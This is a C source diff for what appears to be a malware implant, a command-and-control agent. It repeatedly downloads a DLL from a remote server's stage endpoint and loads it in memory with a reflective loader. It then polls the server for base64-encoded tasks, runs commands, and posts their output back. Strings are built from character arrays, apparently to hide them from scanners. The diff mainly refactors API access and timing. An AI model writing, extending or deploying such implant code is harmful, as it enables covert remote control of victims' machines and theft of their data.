@@ -106,7 +106,7 @@ void myMain()
     DWORD dwRemoteServerLength = myStrlenW(wRemoteServer)+1;
     INTERNET_PORT dwRemotePort = PORT_M;
 
-    if (AgentPopulate(agent, wRemoteServer, dwRemoteServerLength, dwRemotePort, 3) == FALSE)
+    if (AgentPopulate(agent, wRemoteServer, dwRemoteServerLength, dwRemotePort, 3000) == FALSE)
     {
         DEBUG_PRINTF_ERROR("%s", "myMain: AgentPopulate failed\n");
     }
@@ -120,21 +120,23 @@ void myMain()
     #endif
     WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
 
+    //AGENT_downloadPrimalDll(pPrimalDll);
+
     while (pPrimalDll->pBuffer == NULL)
     {
-        pPrimalDll->pBuffer = httpGetExecutable(agent->api, &pPrimalDll->Size, wcStageEndpoint, agent->_remoteServer, agent->_remotePort);
-        ((SLEEP)agent->api->Sleep)(5000);
+        pPrimalDll->pBuffer = httpGetExecutable(&agent->api, &pPrimalDll->Size, wcStageEndpoint, agent->_remoteServer, agent->_remotePort);
+        ((SLEEP)agent->api.Sleep)(5000);
         if (pPrimalDll->pBuffer != NULL)
         { break; }
         #ifdef DEBUG
-        ((MESSAGEBOXA)agent->api->MessageBoxA)(0, msg, msg, 0X0L);
+        ((MESSAGEBOXA)agent->api.MessageBoxA)(0, msg, msg, 0X0L);
         #endif
     }
 
     #ifdef DEBUG
     CHAR ntHeader_f[] = { '1', 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0};
     // e_lfanew = offset to nt headers
-    ((PRINTF)agent->api->printf)(ntHeader_f, (UINT_PTR)(pPrimalDll->pBuffer) + ((PIMAGE_DOS_HEADER)pPrimalDll->pBuffer)->e_lfanew);
+    ((PRINTF)agent->api.printf)(ntHeader_f, (UINT_PTR)(pPrimalDll->pBuffer) + ((PIMAGE_DOS_HEADER)pPrimalDll->pBuffer)->e_lfanew);
     #endif
 
     DLL esgStdDll;
@@ -142,10 +144,10 @@ void myMain()
     pEsgStdDll->pBuffer = NULL;
 
     // the DLL is in its prime form after running the reflective loader
-    pEsgStdDll->pBuffer = executeRD(agent->api, pPrimalDll);
+    pEsgStdDll->pBuffer = executeRD(&agent->api, pPrimalDll);
 
     // free the previous DLL
-    ((FREE)agent->api->free)(pPrimalDll->pBuffer);
+    ((FREE)agent->api.free)(pPrimalDll->pBuffer);
     pPrimalDll->pBuffer = NULL;
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
@@ -185,69 +187,69 @@ void myMain()
 
     while (TRUE)
     {
-        jsonResponse = GetRequest(agent->api, agent->_remoteServer, agent->_remotePort, pathTasks);
+        jsonResponse = GetRequest(&agent->api, agent->_remoteServer, agent->_remotePort, pathTasks);
 
         if (!jsonResponse)
         {
-            ((SLEEP)agent->api->Sleep)(agent->_interval);
+            ((SLEEP)agent->api.Sleep)(agent->_interval);
             continue;
         }
 
         // task is sent in base64 format to prevent corrupting json
-        Task task = readJsonTask(agent->api, jsonResponse);
+        Task task = readJsonTask(&agent->api, jsonResponse);
 
         // if json is empty
         // readJsonTask returns a task struct with all fields equal to NULL
         if (task.taskId == NULL)
         {
-            ((SLEEP)agent->api->Sleep)(agent->_interval);
+            ((SLEEP)agent->api.Sleep)(agent->_interval);
             continue;
         }
 
         if (AgentExecuteTask(agent, PEsgStdApi, pEsgStdDll, task, &taskOutput, &sizeOfOutput) == FALSE)
         {
             DEBUG_PRINTF_WARNING("%s", "myMain: AgentExecuteTask failed, no task present or execution failed\n");
-            ((SLEEP)agent->api->Sleep)(agent->_interval);
+            ((SLEEP)agent->api.Sleep)(agent->_interval);
             continue;
         }
 
         // determine the size for base64 encoded output value
-        ((CRYPTBINARYTOSTRINGA)agent->api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
+        ((CRYPTBINARYTOSTRINGA)agent->api.CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
         // allocate memory for the base64 encoded value
-        b64EncodedOutput = (CHAR*)((CALLOC)agent->api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
+        b64EncodedOutput = (CHAR*)((CALLOC)agent->api.calloc)(b64EncodedOutputSize, sizeof(CHAR));
         // encode plain text output value
-        ((CRYPTBINARYTOSTRINGA)agent->api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
+        ((CRYPTBINARYTOSTRINGA)agent->api.CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
         // calculate the final json size
         totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(task.taskId) + myStrlenA(task.agentUuid);
         // allocate memory for the final json
-        json = (CHAR*)((CALLOC)agent->api->calloc)(totalJsonSize, sizeof(CHAR));
+        json = (CHAR*)((CALLOC)agent->api.calloc)(totalJsonSize, sizeof(CHAR));
         // fill the jsonFormat with relevant values
-        ((SNPRINTF)agent->api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, b64EncodedOutput);
-        PostRequest(agent->api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);
+        ((SNPRINTF)agent->api.snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, b64EncodedOutput);
+        PostRequest(&agent->api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);
 
-        ((FREE)agent->api->free)(taskOutput);
+        ((FREE)agent->api.free)(taskOutput);
         taskOutput = NULL;
-        ((FREE)agent->api->free)(task.taskId);
+        ((FREE)agent->api.free)(task.taskId);
         task.taskId = NULL;
-        ((FREE)agent->api->free)(task.taskParams);
+        ((FREE)agent->api.free)(task.taskParams);
         task.taskParams = NULL;
-        ((FREE)agent->api->free)(task.taskType);
+        ((FREE)agent->api.free)(task.taskType);
         task.taskType = NULL;
-        ((FREE)agent->api->free)(task.agentUuid);
+        ((FREE)agent->api.free)(task.agentUuid);
         task.taskType = NULL;
-        ((FREE)agent->api->free)(orgOutput);
+        ((FREE)agent->api.free)(orgOutput);
         orgOutput = NULL;
-        ((FREE)agent->api->free)(b64EncodedOutput);
+        ((FREE)agent->api.free)(b64EncodedOutput);
         b64EncodedOutput = NULL;
-        ((FREE)agent->api->free)(jsonResponse);
+        ((FREE)agent->api.free)(jsonResponse);
         jsonResponse = NULL;
-        ((FREE)agent->api->free)(json);
+        ((FREE)agent->api.free)(json);
         json = NULL;
 
-        ((SLEEP)agent->api->Sleep)(3000);
+        ((SLEEP)agent->api.Sleep)(3000);
     }
-    ((FREE)agent->api->free)(pEsgStdDll->pBuffer);
+    ((FREE)agent->api.free)(pEsgStdDll->pBuffer);
     pEsgStdDll->pBuffer = NULL;
 }
 
